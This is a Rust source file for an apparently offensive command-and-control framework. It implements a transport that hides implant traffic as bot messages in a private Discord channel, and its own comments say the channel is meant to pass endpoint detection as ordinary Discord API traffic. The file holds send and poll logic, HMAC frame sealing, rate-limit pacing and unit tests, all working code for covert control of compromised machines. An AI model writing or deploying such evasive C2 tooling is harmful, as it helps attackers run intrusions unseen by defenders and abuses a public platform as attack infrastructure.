//! Discord API C2 transport channel.
//!
//! Discord bots are ubiquitous, TLS-encrypted, and content-variable — a
//! Discord channel looks like a game-community chat, not C2 traffic. This
//! channel tunnels C2 frames as bot messages in a private Discord channel:
//! to Discord it is a bot conversation, to EDR it is ordinary Discord API
//! traffic to `discord.com/api/v10`.
//!
//! ## Protocol
//! - `send`: HMAC-seal the frame, Base64-encode the sealed blob, POST to
//!   `/channels/{id}/messages` as message `content`. The HMAC tag is verified
//!   on recv so a third party posting into the channel can never inject a
//!   frame (CRITICAL-22 pattern, same as the Slack channel).
//! - `recv`: Poll `/channels/{id}/messages`, filter out the bot's own
//!   messages, Base64-decode each candidate, verify its HMAC tag, skip
//!   anything that doesn't verify, return the first verified frame.
//! - `health_check`: `GET /users/@me` to verify the token and measure latency.
//!
//! ## Size budget
//! Discord hard-caps message `content` at 2000 characters. Base64 expands
//! 3 bytes → 4 chars, so the largest frame a single message can carry is
//! `floor((2000/4)*3) - FRAME_OVERHEAD` ≈ 1400 bytes (the sealed blob is
//! `tag(32) || len_be(4) || frame`, see [`crate::traits::seal_frame`]).
//! Larger frames are rejected up-front with `PayloadTooLarge` so the stack
//! can fall through to a higher-bandwidth channel instead of failing inside
//! `send`.
//!
//! ## Credentials
//! Uses a Discord Bot token (`Authorization: Bot <token>`) + a channel ID.
//! The bot needs `Send Messages` + `Read Message History` permissions on the
//! channel. `init()`/`health_check()` resolve the bot's own user ID via
//! `/users/@me` so `recv` can skip the bot's own messages.

use std::time::{Duration, Instant};

use base64::Engine as _;
use serde::Deserialize;

use crate::traits::{open_frame, seal_frame, Transport, TransportError};

// ---- Discord API JSON shapes ------------------------------------------------

#[derive(Debug, Deserialize)]
struct MessagesPayload {
    #[serde(default)]
    messages: Vec<DiscordMessage>,
}

#[derive(Debug, Deserialize)]
struct DiscordMessage {
    id: String,
    #[serde(default)]
    content: String,
    #[serde(default)]
    author: Option<DiscordAuthor>,
}

#[derive(Debug, Deserialize)]
struct DiscordAuthor {
    id: String,
}

#[derive(Debug, Deserialize)]
struct CurrentUserPayload {
    id: String,
}

#[derive(Debug, Deserialize)]
struct CreateMessagePayload {
    #[serde(default)]
    id: Option<String>,
}

// ---- Transport --------------------------------------------------------------

const DISCORD_API_BASE: &str = "https://discord.com/api/v10";
/// Inter-message cooldown — Discord rate-limits message sends per channel;
/// 1.2 s mirrors the Slack channel's pacing and stays comfortably under the
/// per-channel burst limit.
const SEND_COOLDOWN_MS: u64 = 1200;
const POLL_INTERVAL_MS: u64 = 500;
/// 2000-char content cap, minus base64 expansion, minus framing overhead.
const MAX_FRAME: usize = 1400;

/// Discord API C2 transport channel.
///
/// Uses a Discord Bot token + channel ID to post and read messages in a
/// private channel. The server and the polling implant exchange
/// Base64-encoded frames as message content.
pub struct DiscordTransport {
    bot_token: String,
    channel_id: String,
    /// HMAC-SHA256 key used to seal/verify relayed frames (CRITICAL-22).
    /// Derived per-channel from the session key so a third party posting
    /// into the channel cannot forge a valid tag.
    channel_secret: [u8; 32],
    bot_user_id: Option<String>,
    agent: ureq::Agent,
    /// Highest snowflake id seen so far (recv cursor).
    last_seen_id: Option<u64>,
    next_send_after: Option<Instant>,
}

impl DiscordTransport {
    /// Create a new Discord transport channel.
    ///
    /// `bot_token` is a Discord bot token (used as `Authorization: Bot <t>`).
    /// `channel_id` is the target channel's snowflake ID. The bot must be a
    /// member of the channel with `Send Messages` and `Read Message History`
    /// permissions.
    ///
    /// `session_key` is the 32-byte shared secret the protocol layer already
    /// holds; it is domain-separated into a per-channel HMAC key
    /// (see [`crate::traits::derive_channel_key`]) so this channel's tags are
    /// not reusable on any other transport. REQUIRED (CRITICAL-22): without
    /// it any third party who can post into the channel could inject a C2
    /// frame.
    pub fn new(bot_token: String, channel_id: String, session_key: &[u8; 32]) -> Self {
        Self {
            bot_token,
            channel_id,
            channel_secret: crate::traits::derive_channel_key(session_key, b"discord"),
            bot_user_id: None,
            agent: ureq::AgentBuilder::new()
                .timeout(Duration::from_secs(10))
                .build(),
            last_seen_id: None,
            next_send_after: None,
        }
    }

    /// Test-only constructor with a fixed all-zero session key, so unit tests
    /// of the plumbing (frame size, name, rate-limit timer) don't need a real
    /// secret.
    #[cfg(test)]
    fn new_for_test(bot_token: String, channel_id: String) -> Self {
        Self::new(bot_token, channel_id, &[0u8; 32])
    }

    // -- internal helpers ---------------------------------------------------

    fn auth_header(&self) -> String {
        format!("Bot {}", self.bot_token)
    }

    /// POST to a Discord API endpoint with a JSON body.
    fn discord_post(
        &self,
        path: &str,
        body: serde_json::Value,
    ) -> Result<ureq::Response, TransportError> {
        let url = format!("{DISCORD_API_BASE}{path}");
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &self.auth_header())
            .set("Content-Type", "application/json; charset=utf-8")
            .send_json(body)
            .map_err(|e| self.classify_ureq_error(e))?;
        Ok(resp)
    }

    /// GET a Discord API endpoint.
    fn discord_get(&self, path: &str) -> Result<ureq::Response, TransportError> {
        let url = format!("{DISCORD_API_BASE}{path}");
        let resp = self
            .agent
            .get(&url)
            .set("Authorization", &self.auth_header())
            .call()
            .map_err(|e| self.classify_ureq_error(e))?;
        Ok(resp)
    }

    /// Classify a `ureq::Error` into a `TransportError`.
    fn classify_ureq_error(&self, e: ureq::Error) -> TransportError {
        match &e {
            ureq::Error::Status(429, _) => TransportError::Transient("Discord rate limited (429)"),
            ureq::Error::Status(401, _) => TransportError::Dead("Discord token invalid (401)"),
            ureq::Error::Status(403, _) => {
                TransportError::Dead("Discord token lacks channel permissions (403)")
            }
            ureq::Error::Status(code, _) if *code >= 500 => {
                TransportError::Transient("Discord server error (5xx)")
            }
            ureq::Error::Transport(_) => {
                TransportError::Transient("Discord transport error (network)")
            }
            _ => TransportError::Transient("Discord API error"),
        }
    }

    /// Resolve the bot's own user ID via `/users/@me`. Used during `init()`
    /// so `recv` can skip the bot's own messages.
    fn resolve_bot_user_id(&mut self) -> Result<(), TransportError> {
        let resp: CurrentUserPayload = self
            .discord_get("/users/@me")?
            .into_json()
            .map_err(|_| TransportError::Transient("Discord /users/@me parse error"))?;
        self.bot_user_id = Some(resp.id);
        Ok(())
    }

    /// Poll the channel for new messages. Returns `Ok(Some(frame))` if a new
    /// C2 message was found, `Ok(None)` if nothing new, or `Err` on failure.
    fn poll_messages(&mut self) -> Result<Option<Vec<u8>>, TransportError> {
        let path = format!("/channels/{}/messages?limit=5", self.channel_id);
        let payload: MessagesPayload = self
            .discord_get(&path)?
            .into_json()
            .map_err(|_| TransportError::Transient("Discord messages parse error"))?;

        // Discord returns messages newest-first. Walk down until we hit a
        // message we've already seen, then stop.
        let mut newest_seen: Option<u64> = None;
        for msg in &payload.messages {
            let Ok(id) = msg.id.parse::<u64>() else {
                continue;
            };
            if newest_seen.is_none() {
                newest_seen = Some(id);
            }
            if self.last_seen_id.is_some_and(|last| id <= last) {
                break;
            }
            // Skip the bot's own messages (the frames we posted).
            let is_own = self
                .bot_user_id
                .as_deref()
                .is_some_and(|uid| msg.author.as_ref().is_some_and(|a| a.id == uid));
            if is_own || msg.content.is_empty() {
                continue;
            }

            // Decode the candidate blob. Bad base64 isn't an error worth
            // killing the channel for — it's just a non-C2 message we skip.
            let Ok(blob) = base64::engine::general_purpose::STANDARD.decode(&msg.content) else {
                continue;
            };

            // Verify the HMAC tag before treating the payload as a frame
            // (CRITICAL-22): a failed tag is a skip, not an error.
            let Ok(frame) = open_frame(&self.channel_secret, &blob) else {
                continue;
            };

            self.last_seen_id = Some(id);
            return Ok(Some(frame));
        }

        // Advance the cursor to the newest message even if we didn't find a
        // C2 message, so we don't re-scan the same messages next poll.
        if let Some(id) = newest_seen {
            self.last_seen_id = Some(id);
        }

        Ok(None)
    }

    /// Enforce send rate limit (1.2 s between messages).
    fn enforce_rate_limit(&mut self) {
        if let Some(next) = self.next_send_after {
            let now = Instant::now();
            if now < next {
                std::thread::sleep(next - now);
            }
        }
    }
}

impl Transport for DiscordTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > MAX_FRAME {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        self.enforce_rate_limit();

        // Seal the frame with an HMAC tag + length prefix before base64 so the
        // receiver can reject anything it didn't seal (CRITICAL-22).
        let sealed = seal_frame(&self.channel_secret, frame);
        let text = base64::engine::general_purpose::STANDARD.encode(&sealed);
        let body = serde_json::json!({
            "content": text,
        });

        let resp = self.discord_post(&format!("/channels/{}/messages", self.channel_id), body)?;
        let payload: CreateMessagePayload = resp
            .into_json()
            .map_err(|_| TransportError::Transient("Discord createMessage parse error"))?;

        if let Some(id) = payload.id {
            if let Ok(snow) = id.parse::<u64>() {
                self.last_seen_id = Some(snow);
            }
        }

        self.next_send_after = Some(Instant::now() + Duration::from_millis(SEND_COOLDOWN_MS));
        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        if self.bot_user_id.is_none() {
            // Lazy-init: resolve bot user ID on first recv if init() wasn't
            // called.
            self.resolve_bot_user_id()?;
        }

        let deadline = Instant::now() + Duration::from_millis(timeout_ms as u64);

        loop {
            match self.poll_messages() {
                Ok(Some(frame)) => return Ok(frame),
                Ok(None) => {
                    if Instant::now() >= deadline {
                        return Err(TransportError::Timeout);
                    }
                    std::thread::sleep(Duration::from_millis(POLL_INTERVAL_MS));
                }
                Err(e) => return Err(e),
            }
        }
    }

    fn health_check(&self) -> Result<u64, TransportError> {
        let start = Instant::now();
        self.discord_get("/users/@me")?;
        Ok(start.elapsed().as_millis() as u64)
    }

    fn name(&self) -> &'static str {
        "discord-api"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }

    fn init(&mut self) -> Result<(), TransportError> {
        self.resolve_bot_user_id()
    }
}

// ---- Tests ----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn max_frame_size_is_discord_content_budget() {
        let t = DiscordTransport::new_for_test("bot-token".into(), "123".into());
        assert_eq!(t.max_frame_size(), 1400);
        // The max frame must actually fit Discord's 2000-char content cap
        // once base64-sealed (regression guard for the size budget).
        let sealed = seal_frame(&t.channel_secret, &vec![0u8; MAX_FRAME]);
        let text = base64::engine::general_purpose::STANDARD.encode(&sealed);
        assert!(
            text.len() <= 2000,
            "max-frame message is {} chars, over Discord's 2000-char cap",
            text.len()
        );
    }

    #[test]
    fn name_is_discord_api() {
        let t = DiscordTransport::new_for_test("bot-token".into(), "123".into());
        assert_eq!(t.name(), "discord-api");
    }

    #[test]
    fn oversized_frame_rejected() {
        let mut t = DiscordTransport::new_for_test("bot-token".into(), "123".into());
        let big = vec![0u8; MAX_FRAME + 1];
        match t.send(&big) {
            Err(TransportError::PayloadTooLarge(n)) => assert_eq!(n, MAX_FRAME + 1),
            other => panic!("expected PayloadTooLarge, got {other:?}"),
        }
    }

    #[test]
    fn send_cooldown_advances_timer() {
        let mut t = DiscordTransport::new_for_test("bot-token".into(), "123".into());
        assert!(t.next_send_after.is_none());
        t.enforce_rate_limit();
        // No-op when next_send_after is None.
        t.next_send_after = Some(Instant::now() + Duration::from_millis(SEND_COOLDOWN_MS));
        let before = Instant::now();
        t.enforce_rate_limit();
        assert!(before.elapsed() >= Duration::from_millis(SEND_COOLDOWN_MS));
    }

    // ---- CRITICAL-22 injection resistance --------------------------------
    //
    // Same properties as the Slack channel: a message whose tag doesn't
    // verify is never decoded as a frame.

    fn sealed_msg_text(t: &DiscordTransport, frame: &[u8]) -> String {
        // Mirror exactly what `send` puts on the wire.
        let sealed = seal_frame(&t.channel_secret, frame);
        base64::engine::general_purpose::STANDARD.encode(&sealed)
    }

    #[test]
    fn sealed_frame_roundtrips_through_framing() {
        let t = DiscordTransport::new_for_test("bot-token".into(), "123".into());
        let frame = b"implant-task-frame-bytes";
        let text = sealed_msg_text(&t, frame);

        let blob = base64::engine::general_purpose::STANDARD
            .decode(&text)
            .expect("sealed message is valid base64");
        assert_eq!(open_frame(&t.channel_secret, &blob).unwrap(), frame);
    }

    #[test]
    fn attacker_plain_base64_blob_is_skipped() {
        let t = DiscordTransport::new_for_test("bot-token".into(), "123".into());
        let attacker_blob = base64::engine::general_purpose::STANDARD
            .encode(b"evil-implant-task-injected-by-human");
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&attacker_blob)
            .unwrap();
        assert_eq!(
            open_frame(&t.channel_secret, &decoded),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn attacker_forged_tag_with_wrong_key_is_skipped() {
        let legit = DiscordTransport::new_for_test("bot-token".into(), "123".into());
        let attacker_key = crate::traits::derive_channel_key(&[0xFFu8; 32], b"discord");
        let forged = seal_frame(&attacker_key, b"evil-task");

        assert_eq!(
            open_frame(&legit.channel_secret, &forged),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn wrong_channel_label_tag_does_not_verify() {
        // A tag sealed under the Slack channel label is not accepted by the
        // Discord channel — domain separation between relay channels.
        let session_key = [0x42u8; 32];
        let discord = DiscordTransport::new("bot-token".into(), "123".into(), &session_key);
        let slack_key = crate::traits::derive_channel_key(&session_key, b"slack");
        let cross_blob = seal_frame(&slack_key, b"x");
        assert_eq!(
            open_frame(&discord.channel_secret, &cross_blob),
            Err(crate::traits::FrameIntegrityError)
        );
    }
}
